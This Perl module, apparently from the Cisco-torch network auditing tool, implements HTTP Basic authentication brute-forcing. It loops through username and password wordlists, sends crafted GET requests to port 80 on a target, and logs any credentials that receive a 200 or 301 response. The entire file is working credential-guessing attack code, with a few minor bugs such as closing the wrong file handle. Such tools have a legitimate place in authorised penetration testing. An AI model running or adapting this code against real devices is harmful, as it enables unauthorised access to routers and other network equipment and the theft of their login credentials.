#*****************************************************************************
# HTTP user an password bruteforce
#******************************************************************************
sub www_brute_up {

my $user, $pass, @users, @password, $auth;

open(PASSFILE, "<$passfile") || die " Cannot open the password file $passfile: $!\n";
        chomp(@password = <PASSFILE>);
close(PASSFILE);
open(USERSFILE, "<$usersfile") || die " Cannot open the password file $passfile: $!\n";
        chomp(@users = <USERSFILE>);
close(PASSFILE);

foreach $user (@users) 
	{
		foreach $pass (@password)
		{


### Base64 hash
  $auth = MIME::Base64::encode("$user:$pass");

chomp($auth);


$sock =IO::Socket::INET->new
                              ( PeerAddr => $target, 
                                PeerPort => 80, 
                                Proto => 'tcp',);
                                
               if ($sock)
	{                 

$sock->autoflush(1);		

$sock->print("GET / HTTP/1.0\r\n");
$sock->print("User-Agent: Cisco-torch $version\r\n");
$sock->print("Host: $target\r\n");
$sock->print("Authorization: Basic $auth\r\n\r\n");	

#sleep(3);
sysread( $sock, $buff, 4096 );
 print " Try username $user password: $pass\n";

if ($buff =~/200 Ok/i or $buff =~/301/i) {
log_print ( "HTTP username: $user  password:$pass \n" , "c");
close ($sock);
return (0);
exit;
}
	}
	
		}
	}
}
#********************************************************************************
# HTTP bruteforce without user
#*******************************************************************************
sub www_brute_p {
	


my  $pass,  @password, $auth;

open(PASSFILE, "<$passfile") || die " Cannot open the password file $passfile: $!\n";
        chomp(@password = <PASSFILE>);
close(PASSFILE);



		foreach $pass (@password)
		{


#	$auth=encode_base64("$user:$password"); ### Base64 hash
  $auth = MIME::Base64::encode(":$pass");

chomp($auth);


$sock =IO::Socket::INET->new  ( PeerAddr => $target, 
                                PeerPort => '80', 
                                Proto => 'tcp', 
                                Timeout  => '1',
                                
                                 
                              );
  
                                 
               if ($sock)
      
	{          
		$sock->autoflush(1);
		
$sock->print("GET / HTTP/1.0\r\n");
$sock->print("User-Agent: Cisco-torch $version\r\n");
$sock->print("Host: $target\r\n");
$sock->print("Authorization: Basic $auth\r\n\r\n");	

#sleep(3);
sysread( $sock, $buff, 4096 );

print " Try password: $pass\n";

if ($buff =~/200 Ok/i or $buff =~/301/i) {
log_print ( "HTTP $ target withour user name  password : $pass \n" , "c");

close ($sock);

}
	}
		}
	return (1);
}

#***************************************************************************
# HTTP bruteforce main
#****************************************************************************
sub brute_www
             {
     log_print ( "Traing brute with pass only/n" ,"i");
   if (www_brute_p())
   {
   	log_print ( "Traing brute with user:pass pair/n" ,"i");
   	www_brute_up()
   }
             	
             }
             
 


 1;
#**************************************************************************